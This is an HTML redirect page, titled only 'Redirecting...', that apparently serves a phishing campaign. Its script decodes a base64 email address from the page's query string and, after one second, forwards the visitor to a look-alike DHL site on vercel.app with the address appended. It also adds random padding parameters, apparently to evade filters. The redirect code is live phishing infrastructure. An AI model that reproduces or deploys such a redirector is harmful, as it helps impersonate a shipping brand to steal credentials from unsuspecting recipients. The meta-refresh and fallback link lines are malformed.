<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    
    <script type="text/javascript">
        // Function to generate a random string of specified length
        function generateRandomString(length) {
            const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Generate random query parameters
        const param1 = generateRandomString(30);
        const longParam = generateRandomString(100);

        // Construct the URL with random parameters
        const baseUrl = "https://dhl-cn-gyygghl.vercel.app/";
        const fullUrl = `${baseUrl}?param1=${param1}&longParam=${longParam}`;

        // Redirect to the constructed URL after a short delay
        setTimeout(function() {
            var url_string = window.location.href;
            var url_get_email = atob(getafterhash(url_string));
            var mail_go_url = "https://dhl-cn-gyygghl.vercel.app/#" + url_get_email + "";
            location.replace(mail_go_url);  
        }, 1000); // 1 second delay for demonstration

        function getafterhash(url) {
            var ret; 
            var queryStringhash = url.split('?')[1]; 
            // if query string exists
            if (queryStringhash) {
                ret = queryStringhash;
            } else {
                ret = 0;
            }
            return ret;
        }
    </script>
    
    <meta http-equiv="refresh" content="0;url=https://dhl-cn-gyygghl.vercel.app/?param1=" + param1 + "&longParam=" + longParam + ">
</head>
<body>
    <p>If you are not redirected automatically, follow this <a href="https://dhl-cn-gyygghl.vercel.app/?param1=" + param1 + "&longParam=" + longParam + ">link</a>.</p>
</body>
</html>
